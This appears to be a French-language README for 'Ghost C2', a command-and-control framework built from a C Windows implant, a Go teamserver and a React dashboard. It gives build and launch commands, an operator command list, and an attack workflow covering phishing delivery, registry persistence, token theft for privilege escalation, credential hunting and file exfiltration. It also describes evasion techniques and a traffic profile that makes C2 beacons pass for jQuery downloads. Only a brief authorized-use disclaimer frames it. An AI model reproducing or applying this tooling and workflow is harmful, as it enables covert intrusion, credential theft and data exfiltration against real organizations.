# 👻 Ghost C2

Encore un framework C2, parce qu'apparemment y'en avait pas assez. Celui-là est plutôt propre par contre - design modulaire, évasion correcte, et ça ressemble pas à un truc codé en un week-end (en vrai c'était plusieurs week-ends).

**Ce qu'il y a dedans :**
- **Agent** - Implant Windows en C pur. Pas de .NET, pas de PowerShell, juste des syscalls.
- **Teamserver** - Backend en Go. Gère les sessions, les tâches, tout ça.
- **Web UI** - Dashboard React parce que les terminaux c'est pour les nerds (je déconne j'adore les terminaux)
- **Profils Malléables** - Fais passer ton trafic pour du jQuery ou autre

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                         OPERATEUR                           │
│  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐    │
│  │   Web UI      │  │   CLI Console │  │   REST API    │    │
│  │   (React)     │  │   (Terminal)  │  │   (HTTP)      │    │
│  └───────┬───────┘  └───────┬───────┘  └───────┬───────┘    │
│          │                  │                  │            │
│          └──────────────────┼──────────────────┘            │
│                             │                               │
│  ┌──────────────────────────▼──────────────────────────┐    │
│  │              TEAMSERVER (Go)                        │    │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐             │    │
│  │  │ Sessions │ │ Tasks    │ │ Profiles │             │    │
│  │  └──────────┘ └──────────┘ └──────────┘             │    │
│  │  ┌──────────────────────────────────────┐           │    │
│  │  │      Listener HTTP/HTTPS             │           │    │
│  │  └──────────────────────────────────────┘           │    │
│  └─────────────────────────┬───────────────────────────┘    │
└────────────────────────────┼────────────────────────────────┘
                             │ (Trafic C2 Chiffré)
                             │
┌────────────────────────────▼────────────────────────────────┐
│                       RESEAU CIBLE                          │
│  ┌───────────────────────────────────────────────────────┐  │
│  │                   GHOST AGENT (C)                     │  │
│  │  ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐      │  │
│  │  │ Evasion │ │ Crypto  │ │ Tasks   │ │ Network │      │  │
│  │  └─────────┘ └─────────┘ └─────────┘ └─────────┘      │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

## Structure du Projet

```
c2-server/
├── agent/                    # L'implant (C)
│   ├── include/              # common.h, ntdefs.h
│   ├── src/
│   │   ├── core/             # Boucle principale, config
│   │   ├── crypto/           # AES, XOR, b64
│   │   ├── evasion/          # Le truc fun
│   │   ├── network/          # Com HTTP
│   │   ├── tasks/            # Handlers de commandes
│   │   └── utils/            # Helpers
│   └── Makefile
│
├── server/                   # Teamserver (Go)
│   ├── cmd/                  # main.go
│   ├── internal/             # api, cli, crypto, listener, etc
│   └── pkg/protocol/         # Structs de messages
│
├── web/                      # Dashboard (React + Vite)
│   └── src/
│
└── profiles/                 # Profils de trafic (yaml)
    ├── default.yaml
    ├── jquery.yaml           # Ressemble à du CDN
    └── microsoft.yaml        # Ressemble à Windows Update
```

## Compatibilité Plateformes

| Composant | Langage | Tourne sur | Dev/Build sur |
|-----------|---------|------------|---------------|
| **Agent** | C | Windows seulement | Mac/Linux (cross-compile avec MinGW) |
| **Teamserver** | Go | Mac/Linux/Windows | N'importe |
| **Web UI** | React | Navigateur | N'importe |

> **Important** : L'agent utilise les APIs Windows (winhttp, ntdll) et produit un `.exe`. Tu le **cross-compiles** depuis Mac/Linux avec `mingw-w64`, puis tu déploies le binaire sur la cible Windows. Le teamserver et le front tournent nativement sur ta machine d'opérateur.

## Démarrage

### Prérequis

- Go 1.21+
- MinGW-w64 (pour cross-compiler l'agent)
- Node 18+

### Installation

```bash
# macOS
brew install mingw-w64

# Deps Go
cd server && go mod download

# Deps npm
cd web && npm install
```

### Compiler l'Agent

```bash
cd agent
make check    # vérifie que mingw est là
make exe      # -> bin/ghost.exe
make dll      # -> bin/ghost.dll
```

### Lancer le Teamserver

```bash
cd server

# Basique
go run cmd/main.go

# Config custom
go run cmd/main.go -api-port 3000 -listener-port 443 -profile profiles/jquery.yaml
```

### Lancer le Web UI

```bash
cd web
npm run dev
# http://localhost:5173
```

## Commandes

Une fois que t'as un callback, voilà ce que tu peux faire :

### Basiques

| Cmd | Ça fait quoi |
|-----|--------------|
| `shell <cmd>` | Exécute une commande cmd.exe |
| `pwd` | Où je suis |
| `cd <path>` | Aller ailleurs |
| `ls` | Lister les fichiers (ou `dir`, c'est pareil) |

### Fichiers

| Cmd | Ça fait quoi |
|-----|--------------|
| `download <file>` | Récupérer un fichier de la cible |
| `upload <file>` | Envoyer un fichier sur la cible |

### Process

| Cmd | Ça fait quoi |
|-----|--------------|
| `ps` | Lister les process |
| `kill <pid>` | Tuer un process |

### Recon

| Cmd | Ça fait quoi |
|-----|--------------|
| `whoami` | Username, domaine, privilèges |
| `sysinfo` | OS, arch, hostname, IPs |

### Tokens

| Cmd | Ça fait quoi |
|-----|--------------|
| `token_list` | Voir les tokens dispo |
| `token_steal <pid>` | Chourer un token |

### Contrôle Agent

| Cmd | Ça fait quoi |
|-----|--------------|
| `sleep <sec>` | Changer l'intervalle de beacon |
| `persist` | Ajouter de la persistence |
| `exit` | Ciao |

## API REST

| Endpoint | Méthode | Notes |
|----------|---------|-------|
| `/api/stats` | GET | Stats dashboard |
| `/api/agents` | GET | Liste des agents |
| `/api/agents/:id` | GET | Détails agent |
| `/api/agents/:id` | DELETE | Supprimer agent |
| `/api/agents/:id/task` | POST | Envoyer commande |
| `/api/agents/:id/tasks` | GET | Historique tâches |

---

## Workflow

Voilà comment tu utilises ce truc en vrai :

```
┌───────────────────────────────────────────────────────────────────────┐
│                          WORKFLOW D'ATTAQUE                           │
└───────────────────────────────────────────────────────────────────────┘

 ┌──────────────────┐
 │  1. SETUP        │
 │  Infrastructure  │
 └────────┬─────────┘
          │
          ▼
 ┌───────────────────────────────────────────────────────────────────────┐
 │  Déployer VPS  ──►  Lancer Teamserver  ──►  Config Profil             │
 │                                                                       │
 │  $ go run cmd/main.go -profile profiles/jquery.yaml -listener 443     │
 └───────────────────────────────────────────────────────────────────────┘
          │
          ▼
 ┌──────────────────┐
 │  2. COMPILE      │
 │  Payload Agent   │
 └────────┬─────────┘
          │
          ▼
 ┌───────────────────────────────────────────────────────────────────────┐
 │  Éditer config.h avec l'URL C2  ──►  make exe  ──►  ghost.exe         │
 │                                                                       │
 │  C2_URL = "https://ton-vps.com"                                       │
 └───────────────────────────────────────────────────────────────────────┘
          │
          ▼
 ┌──────────────────┐
 │  3. DELIVERY     │
 │  Accès Initial   │
 └────────┬─────────┘
          │
          ▼
 ┌───────────────────────────────────────────────────────────────────────┐
 │  Phishing / USB / Exploit  ──►  La cible exécute ghost.exe            │
 │                                                                       │
 │  L'agent s'enregistre et commence à beacon                            │
 └───────────────────────────────────────────────────────────────────────┘
          │
          ▼
 ┌──────────────────┐
 │  4. ENUMERATION  │
 │  Recon Initial   │
 └────────┬─────────┘
          │
          ▼
 ┌───────────────────────────────────────────────────────────────────────┐
 │  Premières commandes recommandées :                                   │
 │                                                                       │
 │  ghost (agent-1) ► whoami          # C'est qui ?                      │
 │  ghost (agent-1) ► sysinfo         # C'est quoi ?                     │
 │  ghost (agent-1) ► pwd             # C'est où ?                       │
 │  ghost (agent-1) ► ps              # Ça tourne quoi ?                 │
 └───────────────────────────────────────────────────────────────────────┘
          │
          ▼
 ┌──────────────────┐
 │  5. PERSISTENCE  │
 │  Rester Résident │
 └────────┬─────────┘
          │
          ▼
 ┌───────────────────────────────────────────────────────────────────────┐
 │  ghost (agent-1) ► persist registry    # Survivre aux reboots         │
 │  ghost (agent-1) ► sleep 300           # Discret (5 min)              │
 └───────────────────────────────────────────────────────────────────────┘
          │
          ▼
 ┌──────────────────┐
 │  6. PRIVILEGE    │
 │  Escalation      │
 └────────┬─────────┘
          │
          ▼
 ┌───────────────────────────────────────────────────────────────────────┐
 │  ghost (agent-1) ► token_list          # Trouver tokens SYSTEM        │
 │  ghost (agent-1) ► token_steal 1234    # Impersonate haut priv        │
 └───────────────────────────────────────────────────────────────────────┘
          │
          ▼
 ┌──────────────────┐
 │  7. POST-EXPLOIT │
 │  Collecte        │
 └────────┬─────────┘
          │
          ▼
 ┌───────────────────────────────────────────────────────────────────────┐
 │  ghost (agent-1) ► shell dir /s *.docx      # Trouver docs            │
 │  ghost (agent-1) ► download C:\secrets.db   # Exfil                   │
 │  ghost (agent-1) ► shell net user /domain   # Enum AD                 │
 └───────────────────────────────────────────────────────────────────────┘
          │
          ▼
 ┌──────────────────┐
 │  8. CLEANUP      │
 │  Sortie Propre   │
 └────────┬─────────┘
          │
          ▼
 ┌───────────────────────────────────────────────────────────────────────┐
 │  ghost (agent-1) ► exit                # Ciao                         │
 └───────────────────────────────────────────────────────────────────────┘
```

### Ref Rapide

| Scénario | Commandes |
|----------|-----------|
| Premier foothold | `whoami` → `sysinfo` → `pwd` → `ps` |
| Chasse aux creds | `shell dir /s *password*.txt` → `download` |
| Grab token | `ps` → `token_steal <pid>` |
| Prép lateral | `shell net view /domain` |
| Exfil | `ls C:\Users\target\Documents` → `download` |
| Mode discret | `sleep 600` → `persist registry` |

## Évasion

L'agent fait quelques trucs pour éviter la détection :

| Technique | Notes |
|-----------|-------|
| PEB Walking | Résout les APIs sans GetProcAddress (pas d'entrées IAT) |
| Syscalls Indirects | Contourne les hooks ntdll |
| Chiffrement Strings | XOR au runtime |
| Anti-Debug | Flags PEB, timing, debug port |
| Détection Sandbox | CPU count, RAM, uptime, artefacts VM |
| Sleep Obfuscation | Chiffre la heap pendant le sleep (WIP) |

## Profils Malléables

Tu peux customiser comment le trafic ressemble. Exemple - faire genre c'est jQuery :

```yaml
# profiles/jquery.yaml
name: "jquery-cdn"
http:
  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"
  get:
    uri:
      - "/jquery-3.6.0.min.js"
      - "/jquery-ui.min.js"
    transform:
      prepend: "/*! jQuery v3.6.0 */\n"
      append: "\n//# sourceMappingURL=jquery.min.map"
```

Les défenseurs réseau voient : "ah c'est juste quelqu'un qui charge jQuery"

## ⚠️ Légal

C'est uniquement pour des tests autorisés et de la recherche. Fais pas le con. Utilise pas ça sur des systèmes que tu possèdes pas ou pour lesquels t'as pas d'autorisation. Je suis pas responsable si tu te fais virer/arrêter/les deux.

## License

À but éducatif. Voir LICENSE.
